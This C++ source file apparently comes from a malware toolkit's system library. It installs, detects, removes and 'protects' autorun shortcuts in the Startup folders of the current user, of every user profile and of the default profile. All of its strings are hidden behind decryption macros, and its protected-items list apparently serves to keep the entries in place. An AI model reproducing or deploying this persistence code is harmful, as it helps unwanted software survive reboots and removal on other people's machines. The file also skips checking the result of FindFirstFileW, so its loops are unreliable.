#include "sys_includes.h"
#include <shlobj.h>
#include <shlwapi.h>

#include "arun.h"
#include "lnk.h"
#include "syslib\debug.h"
#include "syslib\files.h"
#include "syslib\arun.h"
#include "syslib\mem.h"
#include "syslib\osenv.h"
#include "syslib\str.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

namespace SYSLIB
{
    static bool CheckLnk(LPCWSTR lpLnk,LPCWSTR lpExeFile)
    {
        bool bRet=false;
        IShellLink *psl=NULL;
        __try {
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_INPROC_SERVER,IID_IShellLink,(void**)&psl)))
            {
                IPersistFile *ppf=NULL;
                if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile,(void**)&ppf)))
                {
                    if (SUCCEEDED(ppf->Load(lpLnk,STGM_READ)))
                    {
                        WCHAR szPath[MAX_PATH];
                        WIN32_FIND_DATAW wfd;
                        if (SUCCEEDED(psl->GetPath(szPath,MAX_PATH,&wfd,SLGP_RAWPATH)))
                        {
                            if (!lstrcmpiW(lpExeFile,szPath))
                                bRet=true;
                        }
                    }
                    ppf->Release();
                }
                psl->Release();
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {}
        return bRet;
    }

    static bool IsItArun(LPCWSTR lpArunPath,LPCWSTR lpFile)
    {
        bool bRet=false;
        WIN32_FIND_DATAW wfd;
        WCHAR szDir[MAX_PATH];
        StrFormatW(szDir,dcrW_5c6fa2a3("%s\\*.lnk"),lpArunPath);
        HANDLE hFind=FindFirstFileW(szDir,&wfd);
        do
        {
            WCHAR szFileName[MAX_PATH];
            StrFormatW(szFileName,dcrW_4f072b6d("%s\\%s"),lpArunPath,wfd.cFileName);
            if (CheckLnk(szFileName,lpFile))
            {
                bRet=true;
                break;
            }
        }
        while (FindNextFileW(hFind,&wfd));
        FindClose(hFind);
        return bRet;
    }

    bool ArunLnk_CheckUserStartupW(LPCWSTR lpFile,PSID lpSid)
    {
        bool bRet=false;
        WCHAR szStartupDir[MAX_PATH];
        CoInitialize(NULL);
        if (GetUserStartupDirectoryBySidW(lpSid,szStartupDir))
            bRet=IsItArun(szStartupDir,lpFile);
        CoUninitialize();
        return bRet;
    }

    bool ArunLnk_CheckStartupW(LPCWSTR lpFile)
    {
        bool bRet=false;
        PSID lpSid;
        if (SysGetCurrentUserSID(&lpSid))
        {
            bRet=ArunLnk_CheckUserStartupW(lpFile,lpSid);
            MemFree(lpSid);
        }
        return bRet;
    }

    static LPWSTR GetFileDescription(LPCWSTR lpFileName)
    {
        LPWSTR lpDescription=NULL;
        DWORD dwTmp,dwSize=GetFileVersionInfoSizeW(lpFileName,&dwTmp);
        if (dwSize)
        {
            void *lpVerInfo=MemQuickAlloc(dwSize);
            if (lpVerInfo)
            {
                GetFileVersionInfoW(lpFileName,NULL,dwSize,lpVerInfo);
                struct LANGANDCODEPAGE {
                    WORD wLanguage;
                    WORD wCodePage;
                } *lpTrans=NULL;
                UINT dwTransLen=0;
                VerQueryValueW(lpVerInfo,dcrW_6d95e353("\\VarFileInfo\\Translation"),(void**)&lpTrans,&dwTransLen);
                if (dwTransLen >= sizeof(LANGANDCODEPAGE))
                {
                    WCHAR szDecr[100];
                    StrFormatW(szDecr,dcrW_57eaee5a("\\StringFileInfo\\%04x%04x\\FileDescription"),lpTrans->wLanguage,lpTrans->wCodePage);
                    void *lpBuffer;
                    UINT dwBytes;
                    VerQueryValueW(lpVerInfo,szDecr,&lpBuffer,&dwBytes);
                    lpDescription=StrDuplicateW((WCHAR*)lpBuffer,0);
                }
                MemFree(lpVerInfo);
            }
        }
        return lpDescription;
    }

    bool ArunLnk_AppendFileToArunDirInt(LPCWSTR lpFile,LPCWSTR lpDir)
    {
        bool bRet=false;
        CoInitialize(NULL);
        if (!IsItArun(lpDir,lpFile))
        {
            __try {
                IShellLink *psl=NULL;
                if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_INPROC_SERVER,IID_IShellLink,(void**)&psl)))
                {
                    WCHAR szFileName[MAX_PATH],
                          szLnk[MAX_PATH],
                          szPath[MAX_PATH]={0};
                    DWORD dwPathLen=(DWORD_PTR)PathFindFileNameW(lpFile)-(DWORD_PTR)lpFile;
                    memcpy(szPath,lpFile,dwPathLen);
                    CopyFileNameWithoutExtensionW(lpFile,szFileName);
                    StrFormatW(szLnk,dcrW_200fd5c3("%s\\%s.lnk"),lpDir,szFileName);

                    CreateDirectoryTreeW(lpDir);

                    psl->SetPath(lpFile);
                    psl->SetWorkingDirectory(szPath);
                    LPWSTR lpDescr=GetFileDescription(lpFile);
                    psl->SetDescription(lpDescr);
                    MemFree(lpDescr);

                    IPersistFile *ppf=NULL;
                    if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile,(void**)&ppf)))
                    {
                        ppf->Save(szLnk,true);
                        ppf->Release();
                        bRet=true;
                    }
                    psl->Release();
                }
            }
            __except(EXCEPTION_EXECUTE_HANDLER) {}
        }
        else
            bRet=true;
        CoUninitialize();
        return bRet;
    }

    bool ArunLnk_AppendFileToUserW(LPCWSTR lpFile,PSID lpSid)
    {
        bool bRet=false;
        WCHAR szStartupDir[MAX_PATH];
        if (GetUserStartupDirectoryBySidW(lpSid,szStartupDir))
            bRet=ArunLnk_AppendFileToArunDirInt(lpFile,szStartupDir);
        return bRet;
    }

    bool ArunLnk_AppendFileExW(LPCWSTR lpFile)
    {
        bool bRet=false;
        PSID lpSid;
        if (SysGetCurrentUserSID(&lpSid))
        {
            bRet=ArunLnk_AppendFileToUserW(lpFile,lpSid);
            MemFree(lpSid);
        }
        return bRet;
    }

    static bool ArunLnk_AppendFileToDefaultUserW(LPCWSTR lpFile)
    {
        bool bRet=false;
        WCHAR szDefaultUserAutorunDir[MAX_PATH];
        if (SHGetFolderPathW(NULL,CSIDL_STARTUP,(HANDLE)-1,SHGFP_TYPE_DEFAULT,szDefaultUserAutorunDir) == S_OK)
            bRet=ArunLnk_AppendFileToArunDirInt(lpFile,szDefaultUserAutorunDir);
        return bRet;
    }

    static DWORD WINAPI AppendArunCallback(PSID lpSID,ARUN_PARAM *lpParam)
    {
        lpParam->dwRet+=(ArunLnk_AppendFileToUserW(lpParam->lpFile,lpSID) != false);
        return 0;
    }

    bool ArunLnk_AppendFileToAllUsersW(LPCWSTR lpFile)
    {
        ARUN_PARAM apParam={0};
        apParam.lpFile=lpFile;
        EnumUserProfilesParam((ENUMUSERPROFILESCALLBACKPARAM*)AppendArunCallback,&apParam);
        apParam.dwRet+=(ArunLnk_AppendFileToDefaultUserW(lpFile) != false);
        return (apParam.dwRet != 0);
    }

    static bool RemoveFromArunDir(LPCWSTR lpFile,LPCWSTR lpDir)
    {
        bool bRet=false;

        CoInitialize(NULL);
        WIN32_FIND_DATAW wfd;
        WCHAR szDir[MAX_PATH];
        StrFormatW(szDir,dcrW_5c6fa2a3("%s\\*.lnk"),lpDir);
        HANDLE hFind=FindFirstFileW(szDir,&wfd);
        do
        {
            WCHAR szFileName[MAX_PATH];
            StrFormatW(szFileName,dcrW_4f072b6d("%s\\%s"),lpDir,wfd.cFileName);
            if (CheckLnk(szFileName,lpFile))
            {
                bRet=(DeleteFile(szFileName) != FALSE);
                break;
            }
        }
        while (FindNextFileW(hFind,&wfd));
        FindClose(hFind);

        CoUninitialize();
        return bRet;
    }

    static bool ArunLnk_RemoveFromUserW(LPCWSTR lpFile,PSID lpSid)
    {
        bool bRet=false;
        WCHAR szStartupDir[MAX_PATH];
        if (GetUserStartupDirectoryBySidW(lpSid,szStartupDir))
            bRet=RemoveFromArunDir(lpFile,szStartupDir);
        return bRet;
    }

    static bool ArunLnk_RemoveFromDefaultUserW(LPCWSTR lpFile)
    {
        bool bRet=false;
        WCHAR szDefaultUserAutorunDir[MAX_PATH];
        if (SHGetFolderPathW(NULL,CSIDL_STARTUP,(HANDLE)-1,SHGFP_TYPE_DEFAULT,szDefaultUserAutorunDir) == S_OK)
            bRet=RemoveFromArunDir(lpFile,szDefaultUserAutorunDir);
        return bRet;
    }

    static DWORD WINAPI RemoveArunCallback(PSID lpSID,ARUN_PARAM *lpParam)
    {
        lpParam->dwRet+=(ArunLnk_RemoveFromUserW(lpParam->lpFile,lpSID) != false);
        return 0;
    }

    bool ArunLnk_RemoveW(LPCWSTR lpFile)
    {
        ARUN_PARAM apParam={0};
        apParam.lpFile=lpFile;
        EnumUserProfilesParam((ENUMUSERPROFILESCALLBACKPARAM*)RemoveArunCallback,&apParam);
        apParam.dwRet+=(ArunLnk_RemoveFromDefaultUserW(lpFile) != false);
        return (apParam.dwRet != 0);
    }

    static bool ArunLnk_ProtectDirInt(LPCWSTR lpFile,LPCWSTR lpDir,PROTECTED_ITEMS_HIVE *lpHive)
    {
        bool bRet=false;

        WIN32_FIND_DATAW wfd;
        WCHAR szDir[MAX_PATH];
        StrFormatW(szDir,dcrW_5c6fa2a3("%s\\*.lnk"),lpDir);
        HANDLE hFind=FindFirstFileW(szDir,&wfd);
        do
        {
            WCHAR szFileName[MAX_PATH];
            StrFormatW(szFileName,dcrW_4f072b6d("%s\\%s"),lpDir,wfd.cFileName);
            if (CheckLnk(szFileName,lpFile))
            {
                bRet=SYSLIB::Arun_AddProtectedItem(lpHive,PROTECTED_LNK,lpDir,wfd.cFileName);
                break;
            }
        }
        while (FindNextFileW(hFind,&wfd));
        FindClose(hFind);

        return bRet;
    }

    static bool ArunLnk_ProtectUserDirW(LPCWSTR lpFile,PSID lpSid,PROTECTED_ITEMS_HIVE *lpHive)
    {
        bool bRet=false;
        WCHAR szStartupDir[MAX_PATH];
        if (GetUserStartupDirectoryBySidW(lpSid,szStartupDir))
            bRet=ArunLnk_ProtectDirInt(lpFile,szStartupDir,lpHive);
        return bRet;
    }

    static DWORD WINAPI ProtectArunCallback(PSID lpSID,ARUN_PARAM *lpParam)
    {
        lpParam->dwRet+=(ArunLnk_ProtectUserDirW(lpParam->lpFile,lpSID,lpParam->lpHive) != false);
        return 0;
    }

    static bool ArunLnk_ProtectDefaultUserW(LPCWSTR lpFile,PROTECTED_ITEMS_HIVE *lpHive)
    {
        bool bRet=false;
        WCHAR szDefaultUserAutorunDir[MAX_PATH];
        if (SHGetFolderPathW(NULL,CSIDL_STARTUP,(HANDLE)-1,SHGFP_TYPE_DEFAULT,szDefaultUserAutorunDir) == S_OK)
            bRet=ArunLnk_ProtectDirInt(lpFile,szDefaultUserAutorunDir,lpHive);
        return bRet;
    }

    bool ArunLnk_ProtectW(LPCWSTR lpFile,PROTECTED_ITEMS_HIVE *lpHive)
    {
        CoInitialize(NULL);

        ARUN_PARAM apParam={0};
        apParam.lpFile=lpFile;
        apParam.lpHive=lpHive;
        EnumUserProfilesParam((ENUMUSERPROFILESCALLBACKPARAM*)ProtectArunCallback,&apParam);
        apParam.dwRet+=(ArunLnk_ProtectDefaultUserW(lpFile,lpHive) != false);

        CoUninitialize();
        return (apParam.dwRet != 0);
    }

    void ArunLnk_UnprotectW(LPCWSTR lpFile,PROTECTED_ITEMS_HIVE *lpHive)
    {
        if (lpHive->lpLnkItems)
        {
            CoInitialize(NULL);

            PROTECTED_ITEM *lpItem=lpHive->lpLnkItems,*lpPrev=NULL;
            while (lpItem)
            {
                WCHAR szFileName[MAX_PATH];
                StrFormatW(szFileName,dcrW_4f072b6d("%s\\%s"),lpItem->szArunDir,lpItem->szLnkName);
                if (CheckLnk(szFileName,lpFile))
                {
                    PROTECTED_ITEM *lpNext=lpItem->lpNext;

                    if (lpPrev)
                        lpPrev->lpNext=lpNext;
                    else
                        lpHive->lpLnkItems=lpNext;

                    MemFree(lpItem);
                    lpItem=lpNext;
                    continue;
                }

                lpPrev=lpItem;
                lpItem=lpItem->lpNext;
            }

            CoUninitialize();
        }
        return;
    }
}

